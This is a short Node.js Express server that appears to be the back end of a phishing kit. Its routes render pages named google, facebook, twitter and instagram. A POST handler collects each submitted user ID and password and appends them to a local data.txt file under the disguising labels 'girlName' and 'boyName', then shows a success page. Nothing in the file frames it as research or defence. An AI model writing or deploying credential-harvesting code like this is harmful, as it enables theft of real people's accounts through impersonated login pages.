const express = require('express');
const _ = require('lodash');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

app.get('/', function(req, res){
    res.render('home');
});

app.get('/google', function(req, res){
    res.render('google');
});     
app.get('/facebook', function(req, res){
    res.render('facebook');
});
app.get('/twitter', function(req, res){
    res.render('twitter');
});
app.get('/instagram', function(req, res){
    res.render('instagram');
});

app.post('/suc', function(req, res){
    const user = req.body.userId;
    const pwd = req.body.password;
    // Log the user ID and password to the console
    const data = `girlName: ${user}\nboyName: ${pwd}\n\n`;
    fs.appendFile('data.txt', data, (err) => {
      if (err) throw err;
      console.log('Data appended to file successfully!');
    });

    console.log("girlName", user);
    console.log("boyName:", pwd);
    // Render the success page
    res.render('suc');
    
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server is live...');
});